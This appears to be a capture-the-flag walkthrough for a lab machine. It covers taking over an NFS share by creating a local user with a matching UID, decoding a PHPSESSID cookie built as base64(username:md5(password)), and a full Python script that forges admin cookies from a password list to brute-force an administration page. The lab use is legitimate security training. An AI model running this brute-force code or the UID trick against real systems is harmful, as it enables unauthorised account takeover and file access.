# After mounting the shared directory with our local directory, the file can be opened with user_id 1003

```
#sudo mount -t nfs 10.201.118.192:/mnt/share /tmp/hijack
```
<img width="864" height="66" alt="image" src="https://github.com/user-attachments/assets/a9f7adbb-2594-4aa5-9a72-a919f71c7b7a" />

# Create a new user_id 1003 with username 'carlos'

```
#sudo useradd -u 1003 carlos
#sudo passwd carlos
```

# Change user into carlos and check the mounted directory hijack
```
#su carlos
#/bin/bash
#cd /tmp/hijack
```

# PHPSESSID BruteForce [PHPSESSID = base64(username:md5(password))]
When you reload the page, you will see PHPSESSID in inspect mode

<img width="860" height="362" alt="image" src="https://github.com/user-attachments/assets/42b894cc-ba45-493b-8413-a0143470e575" />

When you decode that base64 > you will see MD5 > MD5 decode and you will see password.

# PHPSESSID BruteForce the administration.php page to get admin password.[base64(admin:md5(payload))]
The first one is converting the payload to MD5, followed by adding the prefix “admin:”, and then encoding the entire string in base64. I can then launch the attack.

<img width="789" height="757" alt="image" src="https://github.com/user-attachments/assets/ece54822-efbe-4cb5-999b-f47dc9fab369" />

# You can also use that script to burteforce PHPSESSID

```
import hashlib
import base64
import requests

FILE_NAME = "passwords_list.txt"
USERNAME = "admin"
BASE_IP = "10.201.61.12"
BASE_URL = "http://" + BASE_IP + "/administration.php"

def create_session_id(username, password):
        # md5 encode the password and get its hex value. 
        # str.encode is supposed to convert the password from strings to bytes. 
        md5_hash = hashlib.md5(str.encode(password))
        md5_hash_hex = md5_hash.hexdigest()

        # add the username : 
        before_base64 = username + ":" + md5_hash_hex

        # encode into base64 : 
        after_base64 = base64.b64encode(before_base64.encode("ascii"))

        return after_base64  

def send_request(url,session_id):
        # Send the corresponding request and return the body retruned by the server : 

        headers = {
            'Host': BASE_IP,
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'close',
            'Cookie': 'PHPSESSID=' + session_id,
            'Upgrade-Insecure-Requests': '1'
        }

        r = requests.get(BASE_URL, headers=headers)

        return r.text



with open(FILE_NAME) as f:
        lines = [line.rstrip('\n') for line in f]
        for password in lines:
                # create a session id
                session_id = create_session_id(USERNAME, password)
                # send the created session_id to the web site
                response = send_request(BASE_URL,session_id.decode())
                # Filter the output and print only the matching username and password 
                words_to_search_for = "Access denied"
                if  words_to_search_for not in response:
                        print(f"Success : {USERNAME}:{password}")
```



